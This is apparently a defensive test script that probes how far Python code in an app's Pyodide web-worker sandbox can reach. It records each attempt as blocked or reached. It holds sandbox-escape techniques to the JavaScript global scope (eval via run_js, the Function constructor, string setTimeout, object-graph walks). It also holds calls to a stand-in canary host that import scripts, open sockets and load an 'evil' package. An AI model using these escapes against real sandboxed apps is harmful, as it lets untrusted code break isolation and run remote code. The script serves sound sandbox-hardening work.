# What a script can reach from the worker (PY-4): S17's probes (spike/s17-pyodide/tests), run
# by py-runner.spec.ts against the app's build. The spec prepends CANARY (a URL on another
# origin that counts requests) and SAME (a same-origin URL outside the Pyodide folder). Each probe
# records "reached: ..." or "blocked: <error>"; the script prints the results as JSON.
import json

results = {}


async def probe(name, fn):
    try:
        value = fn()
        if hasattr(value, "__await__"):
            value = await value
        results[name] = "reached: " + repr(value)[:160]
    except BaseException as error:  # noqa: BLE001 - every failure is a result here
        results[name] = "blocked: " + type(error).__name__ + ": " + str(error)[:200]


def js_attr(name):
    import js

    return getattr(js, name)


def js_names():
    import js

    return sorted(n for n in dir(js) if not n.startswith("__"))[:40]


def escape_run_js():
    from pyodide.code import run_js

    return run_js("globalThis")


def escape_function():
    from _wrx_bridge import call

    return call.constructor("return globalThis")()


def pyodide_js():
    import pyodide_js

    return pyodide_js


def global_from_any():
    """The global scope by any means that worked, or raise."""
    for way in (escape_run_js, escape_function):
        try:
            return way()
        except BaseException:  # noqa: BLE001
            pass
    raise RuntimeError("no way to the global scope")


async def pyfetch(url):
    from pyodide.http import pyfetch as fetch

    response = await fetch(url)
    return response.status


def open_url(url):
    from pyodide.http import open_url as open_

    return open_(url).read()[:20]


def imports_canary():
    from pyodide.code import run_js

    return run_js(f"import('{CANARY}import.js')")


def walk():
    """Every JS object reachable from what a script holds, looking for the global scope."""
    import pyodide_js as root_api
    from _wrx_bridge import call
    import js

    seen, queue, found, count = set(), [("pyodide_js", root_api), ("js", js), ("call", call)], [], 0
    skip = ("Array", "Buffer", "Memory", "Module", "DataView")
    while queue and count < 4000:
        path, obj = queue.pop(0)
        count += 1
        try:
            ctor = str(obj.constructor.name)
        except BaseException:  # noqa: BLE001
            ctor = ""
        if ctor in ("DedicatedWorkerGlobalScope", "WorkerGlobalScope", "IDBFactory", "XMLHttpRequest"):
            found.append(path + ":" + ctor)
        if any(s in ctor for s in skip) or path.count(".") > 4:
            continue
        try:
            names = [n for n in dir(obj) if not n.startswith("__")][:200]
        except BaseException:  # noqa: BLE001
            continue
        for n in names:
            try:
                v = getattr(obj, n)
            except BaseException:  # noqa: BLE001
                continue
            if type(v).__name__.startswith("Js") and id(v) not in seen:
                seen.add(id(v))
                queue.append((path + "." + n, v))
    return {"visited": count, "found": found[:10]}


def deep_walk():
    """As walk, into Pyodide's internals too (its Emscripten module and API), which walk skips:
    added by the Phase 6 security review (WP 6.5)."""
    import pyodide_js as root_api

    starts = [("pyodide_js._module", root_api._module), ("pyodide_js._api", root_api._api)]
    seen, queue, found, count = set(), list(starts), [], 0
    skip = ("Array", "Buffer", "Memory", "DataView")
    while queue and count < 6000:
        path, obj = queue.pop(0)
        count += 1
        try:
            ctor = str(obj.constructor.name)
        except BaseException:  # noqa: BLE001
            ctor = ""
        if ctor in ("DedicatedWorkerGlobalScope", "WorkerGlobalScope", "IDBFactory", "XMLHttpRequest", "WebSocket"):
            found.append(path + ":" + ctor)
        if any(s in ctor for s in skip) or path.count(".") > 5:
            continue
        try:
            names = [n for n in dir(obj) if not n.startswith("__")][:300]
        except BaseException:  # noqa: BLE001
            continue
        for n in names:
            if n.startswith("HEAP"):
                continue
            try:
                v = getattr(obj, n)
            except BaseException:  # noqa: BLE001
                continue
            if type(v).__name__.startswith("Js") and id(v) not in seen:
                seen.add(id(v))
                queue.append((path + "." + n, v))
    return {"visited": count, "found": found[:10]}


def async_function_constructor():
    import pyodide_js

    return pyodide_js.loadPackage.constructor("return globalThis")()


def timer_with_text():
    import js

    # Eval by another name: the policy refuses it without throwing, so the proof is the canary.
    return js.setTimeout(f"import('{CANARY}timer-import.js')", 0)


await probe("js module names", js_names)
for name in (
    "self",
    "fetch",
    "XMLHttpRequest",
    "WebSocket",
    "indexedDB",
    "caches",
    "importScripts",
    "postMessage",
    "BroadcastChannel",
    "location",
):
    await probe("js." + name, lambda name=name: js_attr(name))
await probe("pyodide_js", lambda: pyodide_js().version)
await probe("pyodide_js.loadPackage(micropip)", lambda: pyodide_js().loadPackage("micropip"))
await probe("import micropip", lambda: __import__("micropip"))
await probe("pyodide.http.pyfetch(canary)", lambda: pyfetch(CANARY + "pyfetch"))
await probe("pyodide.http.pyfetch(same origin)", lambda: pyfetch(SAME))
await probe("pyodide.http.open_url(canary)", lambda: open_url(CANARY + "open_url"))
await probe("run_js(globalThis) (eval)", escape_run_js)
await probe("Function constructor", escape_function)
await probe("import() from run_js (canary)", imports_canary)
await probe("global.fetch(canary)", lambda: global_from_any().fetch(CANARY + "global-fetch"))
await probe("global.indexedDB.open", lambda: global_from_any().indexedDB.open("s17-probe"))
await probe("global.postMessage(forged done)", lambda: global_from_any().postMessage("forged"))
await probe("global.navigator.storage", lambda: global_from_any().navigator.storage.estimate())
await probe("global.importScripts", lambda: global_from_any().importScripts(CANARY + "x.js"))
await probe("global.BroadcastChannel", lambda: global_from_any().BroadcastChannel.new("wrx-probe"))
await probe("global.caches.keys", lambda: global_from_any().caches.keys())
await probe("global.WebSocket", lambda: global_from_any().WebSocket.new(CANARY.replace("http", "ws")))
await probe(
    "import() via Function constructor (canary)",
    lambda: __import__("_wrx_bridge").call.constructor(f"return import('{CANARY}fn-import.js')")(),
)
await probe(
    "pyodide_js.loadPackage(canary URL)",
    lambda: pyodide_js().loadPackage(CANARY + "evil-1.0-py3-none-any.whl"),
)
await probe("Emscripten IDBFS.indexedDB()", lambda: pyodide_js().FS.filesystems.IDBFS.indexedDB())
await probe("pyodide_js._module (Emscripten)", lambda: type(pyodide_js()._module).__name__)
await probe("object graph walk", walk)
await probe("deep walk (Emscripten module and API)", deep_walk)
await probe("AsyncFunction constructor", async_function_constructor)
await probe("setTimeout with a string (eval)", timer_with_text)
print(json.dumps(results))
